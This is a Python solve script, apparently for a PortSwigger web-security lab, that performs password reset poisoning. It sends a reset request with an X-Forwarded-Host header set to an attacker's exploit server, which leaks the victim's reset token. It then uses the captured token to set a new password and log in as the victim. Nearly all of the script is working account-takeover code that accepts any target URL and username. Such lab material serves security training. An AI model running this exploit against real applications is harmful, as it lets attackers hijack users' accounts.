#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Password reset poisoning via middleware.

Step 1 (automated): triggers the poisoned reset for carlos.
Step 2 (manual): capture token from exploit server logs.
Step 3 (automated): use --token to reset password and log in.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session, url):
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def trigger_reset(lab, victim, exploit_host):
    s = requests.Session()
    s.verify = False
    csrf = get_csrf(s, f"{lab}/forgot-password")
    r = s.post(
        f"{lab}/forgot-password",
        data={"csrf": csrf, "username": victim},
        headers={"X-Forwarded-Host": exploit_host}
    )
    print(f"[*] Reset triggered — status {r.status_code}")
    print(f"[*] Check {exploit_host} access logs for token")


def use_token(lab, token, new_password):
    s = requests.Session()
    s.verify = False
    r = s.get(f"{lab}/forgot-password", params={"temp-forgot-password-token": token})
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not csrf:
        raise SystemExit("[-] CSRF not found on reset form")
    r = s.post(
        f"{lab}/forgot-password",
        params={"temp-forgot-password-token": token},
        data={"csrf": csrf.group(1), "temp-forgot-password-token": token,
              "new-password-1": new_password, "new-password-2": new_password}
    )
    print(f"[*] Password reset — status {r.status_code}")
    return s


def main():
    parser = argparse.ArgumentParser(description="Solve Auth Lab 11 (reset poisoning)")
    parser.add_argument("lab_url")
    parser.add_argument("--exploit-host", help="Your exploit server hostname (for poisoning)")
    parser.add_argument("--victim", default="carlos")
    parser.add_argument("--token", help="Captured reset token (step 2)")
    parser.add_argument("--new-password", default="hacked123", help="New password to set")
    args = parser.parse_args()
    lab = args.lab_url.rstrip("/")

    if args.exploit_host and not args.token:
        trigger_reset(lab, args.victim, args.exploit_host)
        return

    if args.token:
        use_token(lab, args.token, args.new_password)
        s = requests.Session()
        s.verify = False
        csrf = get_csrf(s, f"{lab}/login")
        r = s.post(f"{lab}/login",
                   data={"csrf": csrf, "username": args.victim, "password": args.new_password},
                   allow_redirects=False)
        if r.status_code == 302:
            print(f"[+] Logged in as {args.victim}")
            print("[+] Lab solved.")
        else:
            print(f"[-] Login failed: {r.status_code}")
        return

    print("Usage: provide --exploit-host to trigger poisoning, then --token <TOKEN> to complete")


if __name__ == "__main__":
    main()
